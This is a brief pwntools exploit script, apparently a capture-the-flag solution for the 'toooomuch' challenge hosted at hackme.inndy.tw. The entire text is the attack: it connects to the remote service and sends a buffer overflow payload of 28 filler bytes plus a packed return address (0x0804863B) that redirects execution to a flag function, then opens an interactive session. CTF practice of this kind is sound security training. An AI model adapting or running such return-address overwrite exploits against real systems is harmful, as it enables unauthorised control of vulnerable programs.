from pwn import *

p="./toooomuch"
context.binary=p
#io=process(p)
io=remote("hackme.inndy.tw",7702)
flag_addr=0x0804863B

payload="A"*28+p32(flag_addr)
io.recvuntil("passcode: ")
io.sendline(payload)

io.interactive()
